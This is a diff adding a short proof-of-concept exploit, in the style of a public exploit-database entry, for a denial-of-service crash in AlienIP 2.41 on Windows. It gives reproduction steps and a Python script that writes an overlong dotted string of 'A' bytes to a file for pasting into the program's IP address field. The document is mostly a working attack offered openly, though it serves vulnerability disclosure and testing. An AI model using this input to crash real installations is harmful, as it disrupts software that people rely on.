@@ -1,0 +1,22 @@
+# Exploit Title:  AlienIP 2.41 - Denial of Service (PoC)
+# Author: Arturo de la Cruz Tellez
+# Discovery Date: 2018-10-17
+# Vendor Homepage: http://www.armcode.com
+# Tested Version: 2.41
+# Tested on OS: Microsoft Windows 10 Home Single Language x64
+# Versión	10.0.10240 compilación 10240
+
+# PoC
+# Steps to produce the crash
+# 1.- Run python code : python AlienIP2.41.py
+# 2.- Open AlienIP2.41.txt and copy context to clipboard
+# 3.- Open AlienIP.exe
+# 4.- Paste clipboard on IP address or Country 
+# 5.- Click in Locate host
+# 5.- Enter
+# 6.- Crashed alienip.exe dejo de funcionar
+
+buffer = "\x41" * 200 + "." + "\x41" * 200 + "." + "\x41" * 200 + "." + "\x41" * 69
+f = open ("AlienIP2.41.txt", "w")
+f.write(buffer)
+f.close()
